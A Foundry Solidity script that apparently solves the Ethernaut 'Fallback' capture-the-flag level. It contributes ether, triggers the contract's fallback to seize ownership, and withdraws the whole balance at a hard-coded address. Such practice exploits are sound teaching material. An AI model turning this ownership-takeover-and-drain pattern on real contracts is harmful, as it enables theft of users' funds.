// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/Level01.sol";

contract FallBackScript is Script {
    Fallback public fallbackInstance;

    function setUp() public {
        fallbackInstance = Fallback(payable(0x278c904cc637F09bdf31B37D262E4daD7E877617));
    }

    function run() public {
        vm.startBroadcast();

        // Step 1: Contribute to contract
        fallbackInstance.contribute{value: 0.00005 ether}();

        // Step 2: Get ownership of contract
        (bool success,) = payable(address(fallbackInstance)).call{value: 0.00005 ether}("");
        require(success, "Transaction failed");

        // Step 3: Withdraw all money
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
